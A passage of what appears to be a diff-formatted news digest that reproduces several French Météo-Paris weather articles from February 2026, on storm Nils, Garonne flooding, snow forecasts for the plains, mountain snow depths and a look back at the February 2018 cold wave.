-Le flux basculera temporairement au nord ce week-end avec un refroidissement permettant le retour de la neige jusqu'en plaine. Notre article fait le point sur les régions qui devraient voir tomber les flocons samedi et dimanche. Bref refroidissement ce week-end Dans le sillon de la tempête Nils, un autre minimum dépressionnaire se creusera vers les Baléares durant la journée du vendredi 13 février 2026, se décalant ensuite vers la Corse puis l'Italie durant ce week-end des 14 et 15 février. À l'arrière de cette dépression, la France basculera en flux de secteur nord dès la journée du samedi 14 février. L'air froid actuellement présent sur la Mer du Nord va donc s'engouffrer sur l'hexagone durant la Saint-Valentin. La douceur cèdera sa place à une ambiance plus hivernale. Température de la masse d'air à 850 hPa (vers 1500m) le dimanche 15 février 2026 à minuit - wxcharts.com Malgré tout, il ne s'agira absolument pas d'une offensive hivernale majeure - et encore moins durable. En effet, une nouvelle dépression gagnera le nord-ouest des Îles Britanniques dès le dimanche 15 février 2026 avec une nouvelle accélération du flux d'ouest sur le proche-Atlantique, gagnant déjà l'ouest de la France avec un air océanique plus doux dès la journée de dimanche. Où va-t-il neiger samedi et dimanche ? La bascule en flux de nord causera le décalage d'un front vers l'est de la France et les Pyrénées le samedi 14 février 2026. En plaine, la masse d'air ne sera pas encore assez froide pour que la neige vienne blanchir les sols. Quelques flocons pourront tomber jusqu'aux altitudes les plus basses en fin de front dans l'est, mais sans conséquence. En revanche, il tombera plusieurs centimètres dès la basse montagne. On peut s'attendre à des sols blanchis dès 400m sur les Vosges, 600-700 mètres pour le Jura, le Massif Central et les Alpes avec souvent 5 cm dans les stations. Il neigera plus abondamment dans les Pyrénées où on attend 15 à 25 cm dans les stations et des sols blanchis dès 800 mètres. Risque de neige pour le samedi 14 février 2026 - Météo Villes La journée la plus intéressante à suivre sera celle du dimanche 15 février 2026. Une perturbation arrivera par les régions océaniques avec pluie et douceur. En arrivant sur l'air froid, elle pourrait être précédée de chutes de neige en seconde partie de nuit et matinée du Limousin à la Normandie et jusqu'au bassin parisien. Selon les dernières modélisations, une petite couche est possible avec 1 à 3 cm (tenue plus aisée sur les hauteurs). Le front perdrait en activité en gagnant la Champagne et la Bourgogne mais pourrait se réactiver le soir sur les régions frontalières du nord-est, où la neige pourrait aussi blanchir temporairement les sols, avant que la pluie ne prenne le relais. Risque de neige pour le dimanche 15 février 2026 - Météo Villes Pour l'heure, il existe encore des incertitudes sur les régions qui seront concernées par la neige et sur l'activité de la perturbation. Dans tous les cas, les flocons seront éphémères et la pluie prendra rapidement le relais avec le retour de la douceur dès le lundi 16 février 2026. À lire également : &gt;&gt;&gt; Vigilance rouge pour la tempête Nils avec des vents à plus de 150 km/h &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 6. `FR` [Février 2018 : la dernière "vraie" vague de froid !](data/articles/5d56e562b9a6fd7308787099cd8417da.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-Le dernier mois réellement hivernal en France remonte à février 2018, marqué par deux épisodes importants de chutes de neige et par des températures particulièrement basses, atteignant des niveaux qui n’ont pas (encore) été observés cette année. Sur les 95 vagues de froid observées en France depuis 1900, seule une vague de froid a été observée après 2015 et aucune depuis 2020… La dernière, date donc de février 2018... Source : Serge Saka Une première vague de froid au début du mois Entre le 4 et le 9 février 2018, la France replonge en plein hiver. Un puissant épisode de froid et de neige concerne près des deux tiers du pays, paralysant temporairement plusieurs régions. Tout commence le 5 février, lorsqu’une perturbation venue de Méditerranée remonte vers le nord. La neige tombe jusqu’en plaine sur le Massif central, gagne la vallée du Rhône, la Bourgogne, puis atteint l’Île-de-France en fin de journée. Le 6 février, la situation se complique nettement. Un épisode neigeux majeur frappe l’Île-de-France et les Pays de la Loire. Les chutes deviennent soutenues et tiennent au sol, y compris dans la capitale. Les conséquences sont spectaculaires : un record de 739 kilomètres d’embouteillages est enregistré autour de Paris, piégeant de nombreux automobilistes. Au matin du 7 février, le paysage est est blanc sur les 2/3 du territoire avec une épaisseurs de neige remarquables dans le Bassin parisien. On mesure jusqu’à 25 cm de neige localement, notamment à Vendôme, Dreux ou Versailles, et 12 cm à Paris-Montsouris. Le 8 février, le ciel se dégage mais le froid s’intensifie. Sur des sols enneigés, les températures plongent entre –13°C et –14°C localement, et descendent autour de –6°C à –7°C dans les aéroports parisiens. Enfin, le 9 février, une nouvelle perturbation océanique traverse l’air froid et apporte de nouvelles chutes de neige du Massif central vers l’Île-de-France et le nord du pays, prolongeant cet épisode hivernal marquant. La neige des 6 et 7 février 2018 à Paris où il tombe 12 cm - meteo-paris.com et Alexandre Slowik Une seconde vague de froid, intense, à la fin du mois Du lundi 26 février au jeudi 1er mars 2018, un puissant flux d’air glacial venu de l’est, surnommé le “Moscou-Paris”, envahit une grande partie de l’Europe continentale. Il provoque en France une vague de froid courte mais intense, d’abord sèche, puis accompagnée de neige. Un premier épisode neigeux concerne l’extrême Sud-Est entre le 26 et le 27 février, lié à une instabilité débordant d’Italie. La neige tombe jusqu’en plaine et même sur le littoral entre le Var, les Alpes-Maritimes et l’est des Bouches-du-Rhône. Elle atteint Nice, Menton et surtout Ajaccio, qui se réveille le 27 février sous 15 cm de neige. La nuit des 27-28 février est glaciale sur l’ensemble du pays, avec des températures descendant sous –10°C sur près de la moitié de la France, y compris en Île-de-France, dans le Nord et le Centre. On relève notamment –14,3°C à Luxeuil-les-Bains, –13,4°C à Clermont-Ferrand et Nancy, –11°C à Creil, –10,3°C à Orléans et –10°C à Lyon-Bron. La vague de froid se termine entre le mercredi 28 février au matin et le jeudi 1er mars dans l’après-midi par un épisode neigeux plus généralisé, progressant du Sud-Ouest vers le Nord et le Nord-Ouest. Le Mardi 27 février 2018 au matin, Ajaccio, s'est réveillée sous 15 cm, la plus importante épaisseur de neige dans la ville depuis les 25 cm du 10 février 1986 - source twitter et meteo-paris.com A lire également : &gt;&gt;&gt; La neige à Paris et en Ile de France : toute une histoire &gt;&gt;&gt; Vraie vague de froid venue de Sibérie à partir de lundi &gt;&gt;&gt; Retour de la neige annonçant la fin de la vague de froid &gt;&gt;&gt; Chronique météo du début de l'année 2018 &gt;&gt;&gt; La neige clôt la vague de froid et précède le redoux Auteur : Guillaume Séchet
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 7. `FR` [Vigilance rouge pour la tempête Nils avec des vents à plus de 150 km/h](data/articles/1c28d0c249284b7af161c9130b27da38.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-La tempête Nils s'apprête à frapper la France. Elle débutera par l'arc atlantique durant la nuit du mercredi 11 au jeudi 12 février 2026 avant de s'enfoncer en Méditerranée. Dans certains secteurs, les rafales pourront atteindre les 150 km/h ! Tempête de l'Atlantique à la Méditerranée Associée à un vaste zone dépressionnaire, la tempête Nils se présentera sous la forme d'un minimum dépressionnaire qui se creusera au large de nos côtes atlantiques ce mercredi 11 février 2026. Ce dernier s'enfoncera en Manche durant la nuit du mercredi 11 au jeudi 12 février avec un cœur centré autour de 975 hPa. La dépression se décalera ensuite vers le nord de l'Italie. Les vents les plus forts frapperont d'abord l'arc atlantique avant de s'enfoncer sur le sud-ouest de la France puis le bassin méditerranéen. Position de la tempête Nils durant la nuit du mercredi 11 au jeudi 12 février 2026 - meteoblue Ainsi, les rafales tempétueuses débuteront en nuit du mercredi 11 au jeudi 12 février 2026 sur l'arc atlantique avec 100 à 120 km/h, parfois 130 km/h voire très ponctuellement 140 km/h sur le littoral aquitain ! Ces vents tempétueux vont s'enfoncer sur le sud-ouest avec des pointes de 100-110 km/h au sud de la Garonne jusqu'à jeudi matin. C'est dans le domaine de la tramontane et sur l'ouest des Cévennes que la tempête sera la plus violente avec des rafales de 120 à 140 km/h voire 150-160 km/h sur les sommets jusqu'à jeudi après-midi ! Des rafales du même d'ordre frapperont ensuite la montagne corse et les extrémités de l'île. Notons que dans toutes les régions de l'ouest et du centre de la France, des pointes de 80 à 90 km/h (voire localement 100 km/h) pourront être enregistrées. Rafales maximales générées par la tempête Nils en nuit et journée du jeudi 12 février 2026 - Météo Villes Vigilance rouge dans l'Aude ! Ainsi, les services de Météo France ont placé 17 départements allant de la Vendée à la Corse en vigilance orange tempête, débutant en fin de soirée du mercredi 11 février 2026 et se prolongeant jusqu'en fin de journée du jeudi 12 février. L'Aude a été placée en vigilance ROUGE, ce jeudi 6h à 14h avec des pointes de 150 km/h prévues sur la plaine ! Par ailleurs, de très nombreux départements sont en vigilance orange crues. La Garonne marmandaise a même été placée en vigilance ROUGE crue ! Haute-Savoie, Savoie, Isère et Hautes-Alpes sont en vigilance orange avalanches. Carte de vigilance valable ces mercredi 11 et jeudi 12 février 2026 (tempête Nils) - Météo France Avec de telles rafales de vent, il faut s'attendre à des dégâts, en particulier des côtes atlantiques vers le domaine de la tramontane. De plus, cette tempête interviendra dans un contexte très compliqué. En effet, les précipitations abondantes rendent les sols saturés en eau et donc particulièrement meubles. Ainsi, les racines sont moins bien ancrées dans le sol et le vent peut déraciner plus facilement les arbres. Il faut donc s'attendre à de nombreuses chutes d'arbres au passage de cette tempête Nils. Les sols gorgés en eau sont plus meubles et favorisent le déracinement des arbres par le vent À lire également : &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 8. `FR` [Vers le retour du beau temps (et la fin des inondations) ??](data/articles/42c33b147843878761bcaee76543c20f.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-Bientôt le retour d'un temps plus calme ? Depuis plusieurs semaines, la France subit l’influence d’un courant océanique humide et perturbé, engendrant des précipitations fréquentes, des vents parfois tempétueux et un temps durablement instable. Jusqu'à présent, il était devenu rare d’enchaîner plusieurs jours de temps anticyclonique sur la France. Les hautes pressions ne parvenaient jamais à s’installer durablement, et le courant océanique reprenait rapidement le dessus. Cependant, une amélioration semble se profiler. Bien que le temps reste perturbé dans les prochains jours, les prévisions météorologiques annoncent le retour de conditions anticycloniques pour la fin de semaine sur la France et une partie de l’ouest de l’Europe. En effet, le courant-jet devrait circuler plus au nord de l’Europe en fin de semaine, permettant aux hautes pressions (anticyclone des Açores) de s’étendre à nouveau vers l’ouest du continent, et donc vers la France pour le week-end. Cela devrait assurer le retour d’un temps plus sec et calme durant au moins 4 jours. Prévision de l'évolution des anticyclones et dépressions sur l'Europe du jeudi 16 au lundi 23 février 2026 – Modèle européen via Meteociel Un temps calme s'imposant enfin plus durablement ? Il est difficile de prédire avec certitude. Si les modélisations de ces derniers jours suggéraient une tendance anticyclonique plus durable sur notre pays, les dernières simulations remettent en question cette hypothèse. Le courant océanique pourrait reprendre de la vigueur dès mercredi 25 février à la fin du mois. Prévision de l'évolution des anticyclones et dépressions sur l'Europe du lundi 23 février au lundi 2 mars 2026 – Modèle européen Cependant, certains scénarios envisagent une inversion de la situation et l'arrêt de ce courant perturbé océanique au début du mois de mars avec la formation d'un vaste anticyclone entre les Açores et la partie nord de l'Europe. Ceci annoncerait potentiellement le début d'une nouvelle accalmie beaucoup plus prolongée sur la France, mais il faudra attendre que la dépression qui viendra peut-être s'isoler sur le sud du pays disparaisse. Les tendances pour le mois de mars indiquent même un temps durablement sec. Bien que nous restions prudents, une telle évolution serait un contraste saisissant avec les conditions météorologiques récentes et une excellente nouvelle pour la gestion des crues et inondations. Si la majorité des modèles convergent vers cette prévision, il est essentiel de suivre l’évolution des prévisions dans les prochains jours, car les tendances peuvent changer à une échéance aussi lointaine. Anomalies de précipitations prévues pour le mois de mars 2026 - CFS À lire également : &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Vers les 5 m de neige en haut de certaines stations de ski ? &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Tristan Bergen et Guillaume Séchet
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 9. `FR` [Nombreuses crues et encore beaucoup de pluie à venir...](data/articles/105e462bb588bf69cb5be43e339ed0be.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-Crue majeure de la Garonne à Saint-Léger (47) le jeudi 12 février 2026 - photo Geoffrey Bigey &amp; carte de vigilance des cours d'eau en France au vendredi 13 février 2026 au soir Les crues et les inondations concernent déjà de nombreuses régions. Tous les regards sont tournés vers les nouvelles pluies copieuses attendues ces prochains jours, faisant redouter des crues encore plus importantes. Des dizaines de cours d'eau en crue ! La France vit son début d'année le plus pluvieux depuis 10 ans ! Sur les six premières semaines de l'année, le cumul moyen à échelle nationale atteint 152 mm, soit 64 mm de plus que la normale ! Il faut remonter au début de l'année 2016 pour retrouver des cumuls de précipitations plus importants. Ainsi, la situation s'est fortement dégradée au cours des derniers jours, marqués par des pluies très abondantes. Plusieurs dizaines de cours d'eau du sud et de l'ouest de la France sont actuellement en vigilance orange crue et la Garonne marmandaise et girondine est même en vigilance ROUGE ! C'est donc la Garonne qui subit la crue la plus exceptionnelle, sur deux tronçons situés dans les départements du Lot-et-Garonne (Garonne marmandaise) et de la Gironde (Garonne girondine), où l'alerte rouge est toujours en vigueur. Jeudi 12 février 2026, le niveau de la Garonne a franchi la barre des 9 mètres à Tonneins, où a été prise la photo ci-dessous. Le fleuve sort très loin en dehors de son lit et ses eaux recouvrent de vastes étendues de terre. Les pompiers ont précédé à des évacuations durant la journée de jeudi. Crue majeure de la Garonne à Tonneins (47) le jeudi 12 février 2026 - photo Luis Madeiras Le pire encore à venir ? La situation est particulièrement tendue puisque les sols sont actuellement saturés en eau sur une grande partie du territoire français. La carte ci-dessous représente l'indice d'humidité des sols en surface. Lorsque la couleur vire au bleu foncé, on arrive à la saturation. Si les couleurs virent au mauve, la saturation est totale, ce qui signifie que les sols ne sont plus en mesure d'absorber de nouvelles précipitations. C'est particulièrement le cas dans le sud et l'ouest de la France. Indice d'humidité des sols en surface au 10 février 2026 - Météo France Le problème étant que cette séquence fortement perturbée n'est pas terminée, bien au contraire. Dès ce vendredi 13 février 2026, de nouvelles pluies concerneront la France. On attend de nouvelles perturbations actives, notamment les dimanche 15 et lundi 16 février. Ce sont plusieurs dizaines de millimètres de pluie qui tomberont encore sur une grande partie de l'hexagone d'ici au début de la semaine prochaine avec des cumuls dépassant fréquemment les 50 mm dans le sud-ouest et pouvant atteindre les 100 mm sur les reliefs. Autant dire qu'il faut s'attendre à de nouvelles crues majeures... Cumuls de pluie prévus du vendredi 13 au lundi 16 février 2026 - meteologix.com À lire également : &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; La neige revient jusqu'en Ile-de-France, ce week-end ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Alexandre Slowik
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 10. `FR` [Une autre offensive hivernale possible en milieu de semaine](data/articles/731c6ab78938d48ae50847000206951a.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-La neige fera son retour en Île-de-France ce dimanche 15 février, tout comme sur d'autres régions du nord et du nord-est de la France - Image d'illustration (vue depuis notre caméra meteo-paris.com) Des chutes de neige relativement éphémères auront lieu ce dimanche jusqu'en plaine entre les Hauts-de-France, tout le Bassin parisien et le nord-est du pays. D'autres épisodes pourraient avoir lieu la semaine prochaine. Retour très bref de la neige en plaine L'invasion polaire continentale qui a eu lieu samedi, fut de courte durée, rapidement remplacée par une poussée océanique plus douce. Si l’air froid persiste sur une grande partie de la France ce dimanche, un nouveau front pluvieux traverse rapidement le pays par l’Ouest. Ce front est accompagné d’un net redoux en altitude, mais la pluie est temporairement précédée de neige pendant quelques heures, là où la couche d’air froid sera suffisamment épaisse. Dimanche matin, la Normandie et l’Île-de-France ont connu des chutes de neige moins importantes que prévues, la perturbation s’étant scindée en deux. La neige a principalement touché un axe s’étendant du Limousin aux Pays de la Loire et au Centre, avant de se réactiver sur les Hauts-de-France, la Champagne-Ardenne et la Lorraine dans l’après-midi et la soirée. Évolution prévue des zones enneigées entre dimanche 8h et lundi 3h – (réactualisation de dimanche 6h - Modèle CEP via meteociel) Quelques centimètres, notamment sur les plateaux Ainsi, les cumul de neige ont été revus à la baisse de la Normandie à l'Île-de-France, mais pas forcément ailleurs. Paris n'a par exemple pas du tout été blanchie. Dimanche en fin de journée, les épaisseurs de neige pourraient dépasser 5 cm entre le nord du département de l'Aisne, ainsi que les Ardennes et le nord de la Lorraine. Épaisseurs de neige maximales prévue pour le dimanche 15 février 2026 (réactualisation de dimanche 6h) – Météo-Villes Une semaine à risque sur les régions du Nord et du nord-est Après le redoux de dimanche après-midi, l’air froid reprendra rapidement le dessus sur la moitié nord dès le début de la semaine. Une dépression, déviée vers le sud par l’air froid persistant au nord, devrait s’échouer sur la France entre mercredi soir et jeudi. Les précipitations, sous cet air froid, pourraient se transformer en neige. Il est cependant encore trop tôt pour déterminer précisément les régions concernées. Des chutes de neige significatives sont possibles, avec un risque accru entre la Normandie, l’Île-de-France et toutes les régions situées au nord de la Seine. Explication du risque de neige pour le milieu de la semaine – Météo-Villes À lire également : &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; La neige revient jusqu'en Ile-de-France, ce week-end ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Guillaume Séchet
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 11. `FR` [Vers les 5 m de neige en haut de certaines stations de ski ?](data/articles/40cb1c77e271dff889101cecddf690be.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-La neige est très abondante à Val d'Isère en Savoie actuellement ! - Photographie : Station Val d'Isère Même si la neige reste timide en plaine depuis le début du mois de janvier sur la France, le constat est tout autre en montagne. Avec le temps très humide et perturbé de ces dernières semaines, la neige se montre en effet particulièrement abondante sur la majorité de nos massifs, notamment en moyenne montagne où l'épaisseur est parfois impressionnante, même pour une mi-février. Nous vous proposons donc un petit tour de nos massifs. Enneigement MOYEN par massif en bas et en haut des pistes au vendredi 13 février 2026 - relevés Météo-France Voici la liste des stations de sports d'hiver les plus enneigées en haut des pistes (source : Meteo-France) : Piau Engaly : 350 cm La Rosière 1850 : 300 cm Puy Saint-Vincent : 279 cm Saint-François-Longchamp : 265 cm Bonneval sur Arc : 262 cm Flaine : 260 cm Alpe d’Huez : 255 cm Praloup : 255 cm Arêches-Beaufort : 240 cm Chamrousse : 237 cm Les 2 Alpes : 235 cm Alpes C'est sur la partie nord du massif que les quantités de neige sont les plus importantes en station en cette mi-février 2026. On relève en effet en général entre 90 et 110 cm de neige en bas des pistes de la Haute-Savoie au Queyras en passant par l'Isère, parfois plus comme au Grand-Bornand (74) à 1430m d'altitude où on mesure 155 cm de neige ce 13 février. Les quantités sont en général comprises entre 200 et 300 cm en haut des pistes, là aussi des valeurs particulièrement élevées. L'enneigement est exceptionnel à La Rosière (Savoie), ce vendredi 13 février 2026 - cliché Alexandra Brochard via @MeteoExpress Attention toutefois, ces quantités de neige particulièrement importantes entraînent un risque d'avalanche très élevé en cette fin de semaine. Plusieurs avalanches notables ont d'ailleurs été observées ce jeudi 12 février sur le nord des Alpes. Le sud du massif n'est pas non plus en reste avec là aussi des quantités notables. On mesure en général entre 40 et 60 cm de neige en bas des pistes dans les stations des Alpes-de-Haute-Provence et des Alpes-Maritimes et jusqu'à 200 cm sur les sommets. La nivôse de Millefonts (06) mesure par exemple 147 cm de neige à 2430 m d'altitude, soit 86 cm de plus que l'année dernière à la même période ! Pyrénées Le massif pyrénéen est également particulièrement concerné par les chutes de neige ces dernières semaines. Que ce soit l'est ou l'ouest du massif, toutes les stations observent d'importantes quantités de neige en cette mi-février 2026. Certains secteurs des Pyrénées-Orientales ont même relevé des quantités de neige qui n'avaient plus été vues depuis près de 30 ans et d'autres ont atteint des records au début du mois de février ! Si les quantités restent raisonnables en bas des pistes (entre 20 et 40 cm en général) en raison de plusieurs redoux plus ou moins notables depuis le début du mois de février, on relève le plus souvent 200 à 250 cm de neige sur les sommets ! Corse Comme pour les Pyrénées et les Alpes, le temps agité et très humide de ces dernières semaines a apporté une couche de neige particulièrement importante sur les massifs de l'île de beauté. Celle-ci est même plus importante que dans certains massifs alpins avec en général entre 30 et 50 cm à moyenne altitude et jusqu'à 250 cm sur sommets de la région, localement plus ! On relève par exemple 277 cm à la nivôse de Maniccia (2360m), 157 cm de plus que l'année dernière à la même date et presque 2 m de plus qu'en février 2024 ! La station de Bastelica dans le Val d'Ese a même pu rouvrir ses portes au début du mois de février après 3 ans sans neige ! Les autres massifs français sont malheureusement un peu moins bien fournis en terme de neige car moins élevés. L'air globalement assez doux pour la période a en effet limité les chutes de neige abondante sur le Jura, les Vosges et le Massif Central ces dernières semaines en plus de quelques journées de pluie jusqu'aux sommets de ces massifs, entraînant un lessivage parfois notable. On ne relève en général pas plus de 20-25 cm sur les sommets de ces reliefs, ce qui est à contrario déficitaire. Encore et toujours des chutes de neige en vue ! D'autres chutes de neige abondantes sont prévues d'ici la fin du mois (et notamment d'ici le 24 février) à tel point qu'il pourrait encore tomber 1 m à 2,50 m supplémentaires en haut des pistes, notamment sur le nord des Alpes et l'Ouest des Pyrénées ! Les épaisseurs pourraient ainsi atteindre localement 5 m voire davantage... Cumuls de neige attendus en montagne jusqu'au 24 février 2026 - Allosurf À lire également : &gt;&gt;&gt; 1 mort et de gros dégâts : la tempête Nils a frappé fort ! &gt;&gt;&gt; La neige revient jusqu'en Ile-de-France, ce week-end ! &gt;&gt;&gt; En pleine guerre, l'Ukraine souffre d'un hiver très froid &gt;&gt;&gt; Le retour de la neige en plaine en fin de semaine ? &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Tristan Bergen
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 12. `FR` [Chutes de neige mercredi au nord de la Seine](data/articles/4f54bfa657e8b886ea840d64c1ea3399.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-Après l’épisode neigeux de dimanche (qui a finalement été moins important que prévu), la douceur est revenue rapidement. Cependant, de nouvelles chutes de neige pourraient se produire en limite de l’air froid mercredi matin. Un conflit avec l'air froid sur le nord de la France Dès mardi soir, de l’air froid en provenance de Scandinavie descendra vers l’Allemagne et la Belgique, et pourrait toucher toutes les régions situées au nord de la Seine. Dans cette zone, les températures seront négatives, tandis qu’au sud de la Loire, il fera facilement plus de 10°C. Les régions autour de la Seine seront donc au cœur d’un conflit avec des températures autour de 0 à 1°C et des précipitations causées par une dépression en Manche. Ces précipitations pourraient se transformer en neige, notamment en raison de l’isothermie engendrée par l’intensité et la persistance de ces dernières. Dans ce type de situation, tout est possible, car la formation de la neige dépend de la température et de l’intensité des précipitations. L'étendue et la localisation des chutes de neige régions dépendront également de la position de la dépression. Position des masses d'air à 850 hPa prévues par le modèle MÉTÉO européen pour mercredi matin - fond de carte Meteociel, retravaillé par Meteo-villes Une zone de neige possible au niveau de la Seine ou au nord Depuis trois ou quatre jours, le modèle météo européen prévoit des chutes de neige au nord de la Seine, sur une bande d'environ 150 km de large. Ce secteur est souvent le théâtre de confrontations hivernales entre l’air froid scandinave et la douceur océanique, ce qui peut entraîner d’importantes chutes de neige. Les exemples ne manquent pas… Évolution des épaisseurs de neige prévues par le modèle MÉTÉO américain entre mercredi 00h et jeudi 7h - fond de carte Meteociel, retravaillé par Meteo-villes Selon les cartes de prévision des épaisseurs de neige du modèle météo européen pour mercredi matin, il pourrait tomber entre 1 et 10 cm de neige dans cette zone. Cependant, cette carte pourrait exagérer les chutes de neige, comme ce fut le cas lors de l’épisode de dimanche matin. Ces prévisions dépendent évidemment du conflit, mais surtout des températures. Il est donc possible que seuls les plateaux situés à plus de 100 m d’altitude soient blanchis. Dans ce type de situation, les vallées connaissent généralement des températures trop élevées pour que la neige tienne réellement au sol. Épaisseurs de neige prévues par le modèle MÉTÉO européen pour mercredi matin - fond de carte Meteociel, retravaillé par Meteo-villes Le modèle américain envisage de la neige un peu plus au nord Le modèle météo européen n’est pas le seul à prévoir de la neige ce mercredi matin. Le modèle américain, quant à lui, anticipe un conflit à peu près calé sur la même zone, mais avec des épaisseurs qui semblent plus réalistes. Soyons honnêtes, certains modèles ne prévoient aucune neige, car les températures seraient trop élevées pour sa formation. Dans ces situations « limites », les prévisions météo sont délicates, même à quelques heures d’échéance. Épaisseurs de neige prévues par le modèle MÉTÉO américain pour mercredi matin - fond de carte Meteociel, retravaillé par Meteo-villes A lire également : &gt;&gt;&gt; Une autre offensive hivernale possible en milieu de semaine &gt;&gt;&gt; Vigilance neige pour dimanche, et pas seulement &gt;&gt;&gt; Bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Encore une tempête pour mercredi et jeudi ! Auteur : Guillaume Séchet
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
-### 13. `FR` [Le retour de la neige en plaine en fin de semaine ?](data/articles/203038773fbbd3b8c106341391cf058c.html)
-**Source:** Météo-Paris | **Keyword:** `Local`
-Image d’archive meteo-paris.com de la neige du 7 février 2018 Un retour temporaire du froid en fin de semaine Si le froid est récurrent et parfois marqué depuis maintenant plusieurs semaines sur le nord et l'est de l'Europe, la France est au contraire soumise à une influence océanique très perturbée mais globalement douce depuis les environs de la mi-janvier. Ce type de temps très humide mais plutôt doux persiste cette semaine, toujours lié à cette influence océanique perturbée avec un défilé de perturbations sous un air globalement doux pour la saison venu de l'océan Atlantique. Toutefois, la situation va évoluer en fin de semaine. En effet, une vaste zone dépressionnaire située entre les îles britanniques et le nord de la France va peu à peu glisser vers l'Italie, ce qui permettra au flux de basculer au nord/nord-ouest sur notre pays avec l'arrivée d'air polaire maritime. Animation des températures à 850 hPa sur l’Europe du 9 au 16 février 2026 – Modèle GFS via meteociel Ce retour du froid devrait toutefois rester très temporaire. Comme visible sur l'animation précédente, le flux océanique reprendrait le dessus dès le début de semaine prochaine avec des températures repartant rapidement à la hausse et le retour de pluies parfois abondantes sur la majorité du pays. Un risque de neige jusqu'en plaine ? Si le retour du froid s'annonce temporaire, celui-ci ne devrait pas passer inaperçu pour autant. En effet, celui-ci s'accompagnera d'un risque de neige jusqu'en plaine sur notre pays durant le week-end. À l'arrière de la zone dépressionnaire, alors que l'air froid s'engouffrera rapidement sur la France entre vendredi et samedi, le temps devrait rester instable sur une partie du pays et la neige pourrait s'inviter jusqu'en plaine à l'arrière du front principal en journée de samedi, notamment sur l'est et le nord du pays comme souvent dans ce type de situation. Risque de neige jusqu'en plaine en France pour le samedi 14 février 2026 – Modèle ECMWF via meteociel Bien entendu, la situation pourra encore évoluer d'ici là et ceci ne représente qu'un scénario parmi tant d'autres. Néanmoins, on note un certain consensus des principaux modèles de prévisions ce lundi pour le retour de possible de la neige jusqu'en plaine sur notre pays. Ce risque de neige pourrait de plus persister tout le week-end. En effet, on surveillera aussi un risque d'épisode de neige de redoux à la toute fin du week-end avec l'arrivée d'un nouveau front par l'océan, accompagné d'un redoux en altitude mais arrivant sur l'air froid encore présent sur le nord et l'est de la France, ce qui pourrait signifier un risque de neige de redoux/pluies verglaçantes sur certaines régions. Risque de neige de redoux en France pour le dimanche 15 février 2026 – Modèle ECMWF via meteociel La situation conviendra d'être confirmée d'ici le week-end, celle-ci pouvant encore bien évoluer à une telle échéance en fonction du placement exact des centres d'action dans les prochains jours. En effet, le moindre décalage pourrait annihiler ce risque de neige en plaine sur notre pays. Toutefois, à la vue des modélisations en ce début de semaine, le nord et l'est de la France seraient les plus exposés à ce retour temporaire de l'hiver sur notre pays. Risque de neige en plaine en fin de semaine sur la France – Météo-Villes À lire également : &gt;&gt;&gt; Les tempêtes mémorables de février 1990 &gt;&gt;&gt; Menace de tempête sur la moitié sud pour jeudi &gt;&gt;&gt; L'épisode de pluies verglaçantes de la mi-février 1978 &gt;&gt;&gt; Notre bulletin météo réactualisé quotidiennement &gt;&gt;&gt; Notre compte Twitter très suivi et référence dans tous les médias ! Auteur : Tristan Bergen
-
-</div>
-
-<div class="article-item" data-lang="fr" data-category="weather" data-source="Météo-Paris">
-
